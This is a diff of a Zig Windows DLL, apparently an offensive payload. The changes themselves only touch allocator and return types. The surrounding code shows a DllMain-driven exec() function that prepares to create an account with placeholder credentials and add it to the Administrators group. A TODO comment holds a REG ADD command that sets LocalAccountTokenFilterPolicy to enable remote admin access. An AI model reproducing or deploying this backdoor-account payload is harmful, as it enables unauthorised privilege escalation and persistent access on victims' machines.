@@ -15,21 +15,21 @@ const WINAPI = windows.WINAPI;
 const kernel32 = windows.kernel32;
 extern "kernel32" fn GetLastError() callconv(WINAPI) windows.DWORD;
 
-fn exec() i32 {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+fn exec() windows.BOOL {
+    var gpa = std.heap.DebugAllocator(.{}){};
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
     const pszUsername = std.unicode.utf8ToUtf16LeAllocZ(allocator, "username") catch {
-        return -1;
+        return .FALSE;
     };
     defer allocator.free(pszUsername);
     const pszPassword = std.unicode.utf8ToUtf16LeAllocZ(allocator, "password") catch {
-        return -2;
+        return .FALSE;
     };
     defer allocator.free(pszPassword);
     const pszGroup = std.unicode.utf8ToUtf16LeAllocZ(allocator, "Administrators") catch {
-        return -3;
+        return .FALSE;
     };
     defer allocator.free(pszGroup);
 
@@ -78,10 +78,10 @@ fn exec() i32 {
 
     // TODO: REG ADD HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
-    return windows.TRUE;
+    return .TRUE;
 }
 
-pub export fn DllMain(hinstDLL: win32.HINSTANCE, fdwReason: u32, lpReserved: windows.LPVOID) win32.BOOL {
+pub export fn DllMain(hinstDLL: win32.HINSTANCE, fdwReason: u32, lpReserved: windows.LPVOID) windows.BOOL {
     _ = lpReserved;
     _ = hinstDLL;
     switch (fdwReason) {
@@ -94,5 +94,5 @@ pub export fn DllMain(hinstDLL: win32.HINSTANCE, fdwReason: u32, lpReserved: win
         else => {},
     }
 
-    return windows.TRUE;
+    return .TRUE;
 }
